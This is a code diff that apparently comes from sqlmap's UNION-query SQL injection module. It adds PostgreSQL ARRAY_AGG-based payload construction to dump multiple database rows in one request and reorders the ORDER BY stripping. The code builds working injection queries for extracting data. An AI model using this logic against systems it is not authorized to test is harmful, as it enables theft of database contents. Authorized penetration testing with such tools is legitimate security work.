@@ -135,16 +135,22 @@ def _oneShotUnionUse(expression, unpack=True, limited=False):
                 else:
                     retVal = getUnicode(retVal)
         elif kb.jsonAggMode:
-            output = extractRegexResult(r"(?P<result>%s.*?%s)" % (kb.chars.start, kb.chars.stop), page or "")
-            if output:
-                try:
-                    retVal = ""
-                    for row in json.loads(output[len(kb.chars.start):-len(kb.chars.stop)]):
-                        retVal += "%s%s%s" % (kb.chars.start, row, kb.chars.stop)
-                except:
-                    pass
-                else:
-                    retVal = getUnicode(retVal)
+            if Backend.isDbms(DBMS.PGSQL):
+                output = extractRegexResult(r"(?P<result>%s.*%s)" % (kb.chars.start, kb.chars.stop), page or "")
+                if output:
+                    retVal = output
+            else:
+                output = extractRegexResult(r"(?P<result>%s.*?%s)" % (kb.chars.start, kb.chars.stop), page or "")
+                if output:
+                    output = output[len(kb.chars.start):-len(kb.chars.stop)]
+                    try:
+                        retVal = ""
+                        for row in json.loads(output):
+                            retVal += "%s%s%s" % (kb.chars.start, row, kb.chars.stop)
+                    except:
+                        pass
+                    else:
+                        retVal = getUnicode(retVal)
         else:
             # Parse the returned page to get the exact UNION-based
             # SQL injection output
@@ -248,16 +254,24 @@ def unionUse(expression, unpack=True, dump=False):
     # Set kb.partRun in case the engine is called from the API
     kb.partRun = getPartRun(alias=False) if conf.api else None
 
-    if Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.ORACLE) and expressionFields:
+    if expressionFieldsList and len(expressionFieldsList) > 1 and "ORDER BY" in expression.upper():
+        # Removed ORDER BY clause because UNION does not play well with it
+        expression = re.sub(r"(?i)\s*ORDER BY\s+[\w,]+", "", expression)
+        debugMsg = "stripping ORDER BY clause from statement because "
+        debugMsg += "it does not play well with UNION query SQL injection"
+        singleTimeDebugMessage(debugMsg)
+
+    if Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.ORACLE, DBMS.PGSQL) and expressionFields:
         match = re.search(r"SELECT\s*(.+?)\bFROM", expression, re.I)
         if match and not (Backend.isDbms(DBMS.ORACLE) and FROM_DUMMY_TABLE[DBMS.ORACLE] in expression):
             kb.jsonAggMode = True
             if Backend.isDbms(DBMS.MYSQL):
-                _ = expression.replace(expressionFields, "CONCAT('%s',JSON_ARRAYAGG(CONCAT_WS('%s',%s)),'%s')" % (kb.chars.start, kb.chars.delimiter, expressionFields, kb.chars.stop), 1)
-            else:
-                _ = expression.replace(expressionFields, "'%s'||JSON_ARRAYAGG(%s)||'%s'" % (kb.chars.start, ("||'%s'||" % kb.chars.delimiter).join(expressionFieldsList), kb.chars.stop), 1)
-                _ = re.sub(r"(?i)\s*ORDER BY ROWNUM", "", _)
-            output = _oneShotUnionUse(_, False)
+                query = expression.replace(expressionFields, "CONCAT('%s',JSON_ARRAYAGG(CONCAT_WS('%s',%s)),'%s')" % (kb.chars.start, kb.chars.delimiter, expressionFields, kb.chars.stop), 1)
+            elif Backend.isDbms(DBMS.ORACLE):
+                query = expression.replace(expressionFields, "'%s'||JSON_ARRAYAGG(%s)||'%s'" % (kb.chars.start, ("||'%s'||" % kb.chars.delimiter).join(expressionFieldsList), kb.chars.stop), 1)
+            elif Backend.isDbms(DBMS.PGSQL):
+                query = expression.replace(expressionFields, "ARRAY_AGG('%s'||%s||'%s')::text" % (kb.chars.start, ("||'%s'||" % kb.chars.delimiter).join("COALESCE(%s::text,' ')" % field for field in expressionFieldsList), kb.chars.stop), 1)
+            output = _oneShotUnionUse(query, False)
             value = parseUnionPage(output)
             kb.jsonAggMode = False
     elif Backend.isDbms(DBMS.MSSQL) and kb.dumpColumns:
@@ -266,13 +280,6 @@ def unionUse(expression, unpack=True, dump=False):
         output = _oneShotUnionUse(_, False)
         value = parseUnionPage(output)
         kb.rowXmlMode = False
-
-    if expressionFieldsList and len(expressionFieldsList) > 1 and "ORDER BY" in expression.upper():
-        # Removed ORDER BY clause because UNION does not play well with it
-        expression = re.sub(r"(?i)\s*ORDER BY\s+[\w,]+", "", expression)
-        debugMsg = "stripping ORDER BY clause from statement because "
-        debugMsg += "it does not play well with UNION query SQL injection"
-        singleTimeDebugMessage(debugMsg)
 
     # We have to check if the SQL query might return multiple entries
     # if the technique is partial UNION query and in such case forge the
